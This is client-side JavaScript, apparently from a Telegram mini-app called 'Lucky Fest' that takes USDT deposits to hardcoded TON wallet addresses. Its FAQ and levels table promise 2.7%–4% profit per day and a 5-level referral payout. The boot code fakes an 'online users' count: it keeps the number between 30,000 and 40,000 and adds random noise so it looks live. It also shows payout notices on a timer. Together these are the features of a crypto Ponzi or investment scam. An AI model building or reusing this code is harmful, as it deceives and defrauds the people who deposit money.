  openModal('<div class="modal-head"><h2>How to earn</h2><button class="modal-close" id="mc">Close</button></div><div class="card"><h3 style="color:#60a5fa">Earn by investing</h3><p>Top up USDT — bot runs automatically. Withdraw anytime.</p><button class="btn btn-blue btn-block" id="howTop" style="margin-top:12px">Top up balance</button></div><div class="card"><h3 style="color:#4ade80">Earn by inviting</h3><p>Coins per signup, 5-level USDT, +1 gift per invite.</p><button class="btn btn-lime btn-block" id="howInv" style="margin-top:12px">Invite</button></div>');
  $("#mc").onclick=closeModal; $("#howTop").onclick=()=>{closeModal();openTopup();}; $("#howInv").onclick=()=>{closeModal();shareInvite();};
}

function openTopup(){
  const addrTk=depositAddressTonkeeper(), addrDefi=depositAddressDefi();
  const statusText=state.walletConnected?"Connected: "+shortAddr(state.walletAddress):"Not connected — connect first";
  const connectLabel=state.walletConnected?"Disconnect":"Connect Wallet";
  openModal('<div class="modal-head"><h2>Top up balance</h2><button class="modal-close" id="mc">Close</button></div><p class="hint">Connect wallet, then Deposit. Min 3 USDT.</p><div class="wallet-box"><b>Tonkeeper</b>'+addrTk+'</div><button class="btn btn-dark btn-block btn-sm" id="copyTk">Copy Tonkeeper</button><div class="wallet-box" style="margin-top:10px"><b>Telegram DeFi</b>'+addrDefi+'</div><button class="btn btn-dark btn-block btn-sm" id="copyDefi">Copy DeFi</button><button class="btn btn-blue btn-block" id="connectWallet" style="margin-top:14px">'+connectLabel+'</button><p class="hint" id="walletStatus" style="text-align:center">'+statusText+'</p><button class="btn btn-lime btn-block" id="sendDeposit">Deposit</button>');
  $("#mc").onclick=closeModal; $("#copyTk").onclick=()=>copyText(addrTk); $("#copyDefi").onclick=()=>copyText(addrDefi);
  $("#connectWallet").onclick=()=>connectWallet();
  $("#sendDeposit").onclick=async()=>{if(!state.walletConnected)return toast("Please connect wallet first");await sendDepositFromWallet();};
}

function openWithdraw(){
  const min=(state.config&&state.config.minWithdraw)||3;
  openModal('<div class="modal-head"><h2>Withdraw USDT</h2><button class="modal-close" id="mc">Close</button></div><p class="hint">Minimum '+min+' USDT</p><input class="faq-search" id="wAmt" type="number" placeholder="'+min+'"><input class="faq-search" id="wWallet" placeholder="Wallet address"><button class="btn btn-lime btn-block" id="doW">Request withdrawal</button>');
  $("#mc").onclick=closeModal;
  $("#doW").onclick=async()=>{try{const data=await api("/api/withdraw",{method:"POST",body:JSON.stringify({amount:Number($("#wAmt").value),wallet:$("#wWallet").value})});state.user=data.user;toast("Withdrawal submitted");closeModal();renderTrade();}catch(e){toast(e.message);}};
}

async function openOperations(){
  openModal('<div class="modal-head"><h2>Operations</h2><button class="modal-close" id="mc">Close</button></div><div class="chips" id="opChips"><button class="on" data-t="all">All</button><button data-t="topup">Top-up</button><button data-t="withdraw">Withdrawal</button><button data-t="claim">Profit claim</button><button data-t="coins">Coins</button><button data-t="referral">Referral</button><button data-t="gift">Gift</button></div><div id="opList"><p class="hint">Loading...</p></div>');
  $("#mc").onclick=closeModal; let filter="all";
  const load=async()=>{try{const data=await api("/api/operations?type="+filter);const rows=data.operations||data.items||[];const box=$("#opList");
    if(!rows.length){box.innerHTML='<p class="hint">No operations</p>';return;}
    box.innerHTML=rows.map(r=>{const isCoin=(r.coins&&r.coins>0)||r.type==="gift"||r.type==="referral";
      return '<div class="op-row"><div><div class="t">'+(r.note||r.type)+'</div><div class="d">'+(r.createdAt?new Date(r.createdAt).toLocaleString():"")+'</div></div><div class="amt '+(isCoin?"gold":"green")+'">'+(isCoin?"+"+(r.coins||0)+" coins":"+"+money(r.amount||0,6)+" USDT")+"</div></div>";}).join("");
  }catch(e){$("#opList").innerHTML='<p class="hint">'+e.message+'</p>';}};
  $$("#opChips button").forEach(b=>{b.onclick=()=>{$$("#opChips button").forEach(x=>x.classList.remove("on"));b.classList.add("on");filter=b.dataset.t;load();};});
  load();
}

const FALLBACK_FAQ = [
  { question: "How do I start earning?", answer: "Top up from 3 USDT to start farming. Income starts right after the credit and shows on the home profit card." },
  { question: "How do I top up?", answer: "On Home tap Top up, connect wallet, then Deposit. After payment admin approves and funds appear." },
  { question: "What is the minimum top-up and withdrawal?", answer: "Both top-up and withdrawal start from 3 USDT." },
  { question: "How do I withdraw USDT?", answer: "Tap Withdraw on Home, enter amount and wallet. Admin confirms payout." },
  { question: "How long does a withdrawal take?", answer: "Usually minutes after confirmation. Network may rarely delay a few hours." },
  { question: "How do I claim farm profit?", answer: "On Home or Farm tap Claim profit. Accrued income moves to USDT balance and the counter restarts from 0." },
  { question: "What is the USDT balance?", answer: "Net USDT you earned and can withdraw." },
  { question: "What are coins?", answer: "Coins from registration, invites and gifts. 1 coin = 1 USDT. They pay 0.02% USDT profit per day." },
  { question: "How do I get more coins?", answer: "Invite friends, open gifts, complete Tasks." },
  { question: "How does the referral program work?", answer: "Invite from Friends. Coins per signup, USDT from 5-level top-ups, +1 gift per invite." },
  { question: "What is 5-level income?", answer: "10% / 3% / 2% / 1% / 1% from every top-up in your structure." },
  { question: "How do I open a gift?", answer: "In Gifts tap a card. Prize reel stops on Coin or USDT." },
  { question: "What can I win in gifts?", answer: "Coins (2–7) or small USDT (0.1–0.5). NFT/TON are visual only." },
  { question: "Why isn't income growing?", answer: "Income runs with balance. After claim the counter restarts from 0. Top-up raises daily income." },
  { question: "What percent is paid per day?", answer: "USDT uses level percent 2.7%–4%. Coins pay separate 0.02%." },
  { question: "Is withdrawing safe?", answer: "Funds go to the wallet you enter. Check address carefully." },
  { question: "How do I change the theme?", answer: "Account → Theme. Light or dark is saved on device." },
  { question: "Where do I get help?", answer: "Account → Help opens @assistant_bd. Or search FAQ." }
];

async function openFAQ(){
  openModal(`
    <div class="modal-head"><h2>FAQ</h2><button class="modal-close" id="mc">Close</button></div>
    <input class="faq-search" id="faqSearch" placeholder="Search questions">
    <div id="faqList"><p class="hint">Loading...</p></div>
  `);
  $("#mc").onclick = closeModal;
  let items = [];
  try {
    const data = await api("/api/faq");
    // Server returns { faqs: [...] }
    items = data.faqs || data.faq || data.items || [];
  } catch (_) {}
  if (!items.length) items = FALLBACK_FAQ;
  const render = (q) => {
    const qq = (q || "").toLowerCase();
    const list = items.filter((x) => {
      const qu = (x.question || x.q || "").toLowerCase();
      const an = (x.answer || x.a || "").toLowerCase();
      return !qq || qu.includes(qq) || an.includes(qq);
    });
    $("#faqList").innerHTML = list.map((x) => {
      const qu = x.question || x.q || "";
      const an = x.answer || x.a || "";
      return '<div class="faq-item"><button type="button" class="faq-q">' + qu +
        '<span>⌄</span></button><div class="faq-a">' + an + "</div></div>";
    }).join("") || '<p class="hint">No results</p>';
    $$(".faq-item").forEach((el) => {
      el.querySelector(".faq-q").onclick = () => el.classList.toggle("open");
    });
  };
  render("");
  $("#faqSearch").oninput = (e) => render(e.target.value);
}

function openLanguage(){
  const langs=[["EN","English","English"],["RU","Русский","Russian"],["ES","Español","Spanish"],["TR","Türkçe","Turkish"],["ID","Indonesia","Indonesian"]];
  const cur=(state.user&&state.user.language)||"English";
  openModal('<div class="modal-head"><h2>Language</h2><button class="modal-close" id="mc">Close</button></div>'+
    langs.map(([f,n,en])=>'<div class="lang-item '+(en===cur?"on":"")+'" data-l="'+en+'"><span class="flag">'+f+'</span><div><b>'+n+'</b></div></div>').join(""));
  $("#mc").onclick=closeModal;
  $$(".lang-item").forEach(el=>{el.onclick=async()=>{try{await api("/api/settings",{method:"POST",body:JSON.stringify({language:el.dataset.l})});if(state.user)state.user.language=el.dataset.l;toast("Language: "+el.dataset.l);closeModal();renderAccount();}catch(e){toast(e.message);}};});
}

function openLevels(){
  openModal('<div class="modal-head"><h2>Levels</h2><button class="modal-close" id="mc">Close</button></div><p class="hint">Level depends on USDT balance. Coins: 0.02%/day separate.</p><table class="lvl-table"><thead><tr><th>LEVEL</th><th>FROM</th><th>PERCENT</th><th>PER MONTH</th></tr></thead><tbody><tr><td>1</td><td>3 USDT</td><td>2.7%</td><td>$6.67</td></tr><tr><td>2</td><td>15 USDT</td><td>3%</td><td>$36.41</td></tr><tr><td>3</td><td>50 USDT</td><td>3.2%</td><td>$128.64</td></tr><tr><td>4</td><td>100 USDT</td><td>3.4%</td><td>$272.66</td></tr><tr><td>5</td><td>250 USDT</td><td>3.7%</td><td>$743.54</td></tr><tr><td>6</td><td>500 USDT</td><td>3.8%</td><td>$1530.70</td></tr><tr><td>7</td><td>1000 USDT</td><td>4%</td><td>$3243.40</td></tr></tbody></table>');
  $("#mc").onclick=closeModal;
}

function go(page){
  state.page=page;
  $$(".nav-btn").forEach(b=>b.classList.toggle("active",b.dataset.page===page));
  const map={trade:renderTrade,friends:renderFriends,farm:renderFarm,gifts:renderGifts,tasks:renderTasks,account:renderAccount};
  (map[page]||renderTrade)();
}

function nextInviteReward(count){const n=Number(count)||0;if(n<=0)return 50;if(n===1)return 30;if(n===2)return 20;return 10;}


/* ---------- Boot ---------- */
async function boot() {
  $("#closeBtn").onclick = () => { if (tg) tg.close(); };
  $$(".nav-btn").forEach(b => b.onclick = () => go(b.dataset.page));

  // Init TON Connect early
  setTimeout(initTonConnect, 400);

  try {
    state.config = await api("/api/config");
  } catch(e) {
    state.config = {
      channelUrl: "https://t.me/Lucky_Fest_Official",
      depositAddress: "UQCzzBp_io5zdMiOCMykYY7HzUFkhRqST-xMWvr_DzSScooi",
      depositAddressTonkeeper: "UQCzzBp_io5zdMiOCMykYY7HzUFkhRqST-xMWvr_DzSScooi",
      depositAddressDefi: "UQAVEPBT35E0amE3PpQObBDC9ZGAflMcNlUpwCRVph2eHXkg",
      botName: "Lucky Fest"
    };
  }

  try {
    const me = await api("/api/me");
    state.user = me;
    state.isAdmin = !!me.isAdmin;
    if (me.theme === "light") document.body.classList.add("theme-light");
  } catch(e) {
    state.user = {
      name: "Demo User", photoUrl: "/assets/assistant-logo.jpg", level: 1,
      coins: 56, usdt: 0.0005, claimedUsdt: 0, incomeHour: 0.0005, incomeDay: 0.012, incomeMonth: 0.36,
      gifts: 2, referralCount: 0, language: "English", theme: "dark", telegramId: "demo"
    };
  }

  go("farm");
  // Live online counter: smooth up/down while app is open
  let onlineTarget = 35000;
  let onlineDisplay = 35000;
  let onlineAnimTimer = null;

  function renderOnlineNow() {
    const el = $("#onlineCount");
    if (el) el.textContent = fmtOnline(Math.round(onlineDisplay));
  }

  function animateOnlineTo(target) {
    onlineTarget = Math.min(40000, Math.max(30000, Number(target) || 35000));
    if (onlineAnimTimer) return; // already animating tick
    onlineAnimTimer = setInterval(() => {
      const diff = onlineTarget - onlineDisplay;
      if (Math.abs(diff) < 8) {
        onlineDisplay = onlineTarget;
        renderOnlineNow();
        clearInterval(onlineAnimTimer);
        onlineAnimTimer = null;
        return;
      }
      // ease toward target
      onlineDisplay += diff * 0.08 + (Math.random() - 0.5) * 15;
      onlineDisplay = Math.min(40000, Math.max(30000, onlineDisplay));
      renderOnlineNow();
    }, 700);
  }

  const updateOnline = () => {
    api("/api/heartbeat", { method: "POST", body: "{}" }).then(d => {
      if (d && d.online) animateOnlineTo(d.online);
    }).catch(() => {
      // offline fallback: still wiggle locally
      animateOnlineTo(30000 + Math.floor(Math.random() * 10000));
    });
  };
  updateOnline();
  setInterval(updateOnline, 10000);
  // local micro-wiggle every 1.2s so it never looks frozen
  setInterval(() => {
    if (!onlineAnimTimer) {
      const wiggle = onlineTarget + (Math.random() - 0.5) * 80;
      animateOnlineTo(wiggle);
    }
  }, 4500);
  setInterval(showPayouts, 12000);
  setTimeout(showPayouts, 2500);
}

boot();
